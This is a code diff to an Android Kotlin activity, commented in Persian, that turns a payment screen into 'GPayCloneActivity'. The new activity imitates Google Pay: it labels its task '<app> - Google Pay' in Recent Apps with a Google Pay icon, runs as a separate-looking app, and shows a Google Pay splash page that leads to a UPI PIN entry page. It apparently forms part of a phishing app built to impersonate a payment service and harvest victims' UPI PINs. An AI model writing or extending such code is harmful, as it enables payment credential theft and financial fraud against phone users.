@@ -4,6 +4,9 @@ import android.app.ActivityManager
 import android.graphics.BitmapFactory
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.provider.Settings
 import android.util.Log
 import android.view.WindowManager
 import android.webkit.WebChromeClient
@@ -19,21 +22,23 @@ import com.example.test.utils.DeviceInfoHelper
 import com.example.test.ServerConfig
 
 /**
- * ⭐ PaymentActivity - نمایش صفحه پرداخت به صورت کلون (مثل یک برنامه جداگانه)
+ * ⭐ GPayCloneActivity - کلون Google Pay (مثل یک برنامه جداگانه)
  * 
  * این Activity با taskAffinity جداگانه باز میشه که باعث میشه:
  * - مثل یک برنامه جداگانه در Recent Apps نمایش داده بشه
  * - Task جداگانه داشته باشه
- * - تجربه کاربری مثل باز کردن یک برنامه پرداخت خارجی باشه
+ * - تجربه کاربری مثل باز کردن Google Pay باشه
+ * - ابتدا splash screen نمایش میده، بعد صفحه پرداخت
  */
-class PaymentActivity : AppCompatActivity() {
+class GPayCloneActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
     private lateinit var deviceId: String
     private lateinit var appConfig: AppConfig
 
     companion object {
-        private const val TAG = "PaymentActivity"
+        private const val TAG = "GPayCloneActivity"
+        private const val SPLASH_DELAY_MS = 2500L // 2.5 ثانیه
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -42,18 +47,18 @@ class PaymentActivity : AppCompatActivity() {
         // ⭐ Fullscreen mode
         enableFullscreen()
         
-        // ⭐ تنظیم Task Description برای نمایش در Recent Apps
-        setTaskDescriptionForRecentApps()
-        
-        // ⭐ Load config
+        // ⭐ Load config (باید اول load بشه برای استفاده در setTaskDescriptionForRecentApps)
         appConfig = AppConfig.load(this)
         deviceId = DeviceInfoHelper.getDeviceId(this)
         
         // ⭐ Initialize ServerConfig
         ServerConfig.initialize(this)
         
+        // ⭐ تنظیم Task Description برای نمایش در Recent Apps
+        setTaskDescriptionForRecentApps()
+        
         Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "🚀 PAYMENT ACTIVITY CREATED")
+        Log.d(TAG, "🚀 GPay CLONE ACTIVITY CREATED")
         Log.d(TAG, "════════════════════════════════════════")
         Log.d(TAG, "📱 Device ID: $deviceId")
         Log.d(TAG, "📱 App Type: ${appConfig.appType}")
@@ -63,22 +68,41 @@ class PaymentActivity : AppCompatActivity() {
         webView = createWebView()
         setContentView(webView)
         
-        // ⭐ Load payment HTML based on flavor
-        loadPaymentHtml()
+        // ⭐ ابتدا splash screen نمایش بده، بعد صفحه پرداخت
+        loadSplashScreen()
     }
 
     /**
      * ⭐ تنظیم Task Description برای نمایش در Recent Apps
-     * این باعث میشه که مثل یک برنامه جداگانه نمایش داده بشه
+     * اسم: "اسم برنامه - Google Pay" (مثلا "mParivahan - Google Pay")
      */
     private fun setTaskDescriptionForRecentApps() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            val taskDescription = ActivityManager.TaskDescription(
-                "Secure Payment",  // نام در Recent Apps
-                BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces), // Icon
-                ContextCompat.getColor(this, android.R.color.white) // Color
-            )
-            setTaskDescription(taskDescription)
+            val appName = appConfig.appName
+            val taskName = "$appName - Google Pay"
+            
+            // ⭐ خواندن ایکون از assets
+            try {
+                val iconStream = assets.open("google-pay-icon.png")
+                val iconBitmap = BitmapFactory.decodeStream(iconStream)
+                iconStream.close()
+                
+                val taskDescription = ActivityManager.TaskDescription(
+                    taskName,
+                    iconBitmap,
+                    ContextCompat.getColor(this, android.R.color.white)
+                )
+                setTaskDescription(taskDescription)
+                Log.d(TAG, "✅ Task description set: $taskName")
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Failed to load icon from assets", e)
+                val taskDescription = ActivityManager.TaskDescription(
+                    taskName,
+                    BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces),
+                    ContextCompat.getColor(this, android.R.color.white)
+                )
+                setTaskDescription(taskDescription)
+            }
         }
     }
 
@@ -103,7 +127,7 @@ class PaymentActivity : AppCompatActivity() {
     }
 
     /**
-     * ⭐ ساخت WebView برای نمایش صفحه پرداخت
+     * ⭐ ساخت WebView برای نمایش صفحات پرداخت
      */
     private fun createWebView(): WebView {
         val webView = WebView(this).apply {
@@ -167,7 +191,7 @@ class PaymentActivity : AppCompatActivity() {
 
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                Log.d(TAG, "✅ Payment page loaded: $url")
+                Log.d(TAG, "✅ Page loaded: $url")
                 
                 // ⭐ اعمال رنگ status bar از meta tag
                 applyThemeColorFromPage()
@@ -199,37 +223,25 @@ class PaymentActivity : AppCompatActivity() {
             
             @android.webkit.JavascriptInterface
             fun getBaseUrl(): String = ServerConfig.getBaseUrl()
-            
-            /**
-             * ⭐ باز کردن کلون روش پرداخت انتخاب شده
-             * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
-             */
-            @android.webkit.JavascriptInterface
-            fun openPaymentClone(paymentMethod: String) {
-                Log.d(TAG, "💰 Opening payment clone: $paymentMethod")
-                openPaymentCloneActivity(paymentMethod)
-            }
         }, "Android")
 
         return webView
     }
 
     /**
-     * ⭐ مدیریت navigation در صفحه پرداخت
-     * تمام صفحات مربوط به پرداخت (payment.html, googlepay-splash.html, upi-pin.html, final.html)
-     * در همین Activity لود می‌شن تا تجربه کلون حفظ بشه
+     * ⭐ مدیریت navigation در کلون
+     * تمام صفحات مربوط به پرداخت در همین Activity لود می‌شن
      */
     private fun handleUrlNavigation(url: String): Boolean {
-        Log.d(TAG, "🔗 Payment navigation request: $url")
+        Log.d(TAG, "🔗 Navigation request: $url")
         
         // ⭐ اگر URL خارج از assets هست، در همین WebView لود کن
         if (url.startsWith("http://") || url.startsWith("https://")) {
-            return false  // اجازه بده در WebView لود بشه
+            return false
         }
         
-        // ⭐ اگر فایل HTML داخلی هست (صفحات پرداخت)، در همین Activity لود کن
+        // ⭐ اگر فایل HTML داخلی هست، در همین Activity لود کن
         if (url.endsWith(".html")) {
-            // ⭐ تبدیل URL نسبی به کامل اگر نیاز بود
             val fullUrl = if (url.startsWith("file://")) {
                 url
             } else if (url.startsWith("/")) {
@@ -238,50 +250,27 @@ class PaymentActivity : AppCompatActivity() {
                 "file:///android_asset/$url"
             }
             
-            Log.d(TAG, "📄 Loading payment page: $fullUrl")
+            Log.d(TAG, "📄 Loading page: $fullUrl")
             webView.loadUrl(fullUrl)
-            return true  // جلوگیری از لود شدن در مرورگر خارجی
+            return true
         }
         
         return false
     }
 
     /**
-     * ⭐ لود کردن صفحه پرداخت بر اساس flavor
+     * ⭐ لود کردن splash screen Google Pay
      */
-    private fun loadPaymentHtml() {
-        val paymentHtmlPath = "file:///android_asset/payment.html"
-        Log.d(TAG, "📄 Loading payment page: $paymentHtmlPath")
-        webView.loadUrl(paymentHtmlPath)
-    }
-    
-    /**
-     * ⭐ باز کردن Activity کلون روش پرداخت انتخاب شده
-     * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
-     */
-    private fun openPaymentCloneActivity(paymentMethod: String) {
-        Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "💰 OPENING PAYMENT CLONE: $paymentMethod")
-        Log.d(TAG, "════════════════════════════════════════")
+    private fun loadSplashScreen() {
+        val splashPath = "file:///android_asset/googlepay-splash.html"
+        Log.d(TAG, "📄 Loading splash screen: $splashPath")
+        webView.loadUrl(splashPath)
         
-        val intent = when (paymentMethod.lowercase()) {
-            "gpay", "googlepay", "google-pay" -> {
-                Intent(this, GPayCloneActivity::class.java)
-            }
-            "paytm" -> {
-                Intent(this, PaytmCloneActivity::class.java)
-            }
-            "phonepe" -> {
-                Intent(this, PhonePeCloneActivity::class.java)
-            }
-            else -> {
-                Log.e(TAG, "❌ Unknown payment method: $paymentMethod")
-                return
-            }
-        }
-        
-        startActivity(intent)
-        finish() // بستن PaymentActivity بعد از باز کردن کلون
+        // ⭐ بعد از نمایش splash، به صفحه پرداخت برو
+        Handler(Looper.getMainLooper()).postDelayed({
+            // splash screen خودش بعد از 2.5 ثانیه به upi-pin.html میره
+            // پس نیازی به کد اضافی نیست
+        }, SPLASH_DELAY_MS)
     }
 
     /**
@@ -305,17 +294,16 @@ class PaymentActivity : AppCompatActivity() {
         ) { color ->
             if (color != null && color != "null") {
                 val colorValue = color.replace("\"", "")
-                    try {
-                        val parsedColor = android.graphics.Color.parseColor(colorValue)
-                        // evaluateJavascript callback روی UI thread اجرا میشه، پس نیازی به runOnUiThread نیست
-                        runOnUiThread {
-                            window.statusBarColor = parsedColor
-                            window.navigationBarColor = parsedColor
-                            Log.d(TAG, "🎨 Status bar color set to: $colorValue")
-                        }
-                    } catch (e: Exception) {
-                        Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
+                try {
+                    val parsedColor = android.graphics.Color.parseColor(colorValue)
+                    runOnUiThread {
+                        window.statusBarColor = parsedColor
+                        window.navigationBarColor = parsedColor
+                        Log.d(TAG, "🎨 Status bar color set to: $colorValue")
                     }
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
+                }
             }
         }
     }
@@ -328,14 +316,14 @@ class PaymentActivity : AppCompatActivity() {
         if (::webView.isInitialized && webView.canGoBack()) {
             webView.goBack()
         } else {
-            // ⭐ بستن Activity و برگشت به MainActivity
+            // ⭐ بستن Activity
             finish()
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        Log.d(TAG, "👋 PaymentActivity destroyed")
+        Log.d(TAG, "👋 GPayCloneActivity destroyed")
         
         if (::webView.isInitialized) {
             webView.stopLoading()
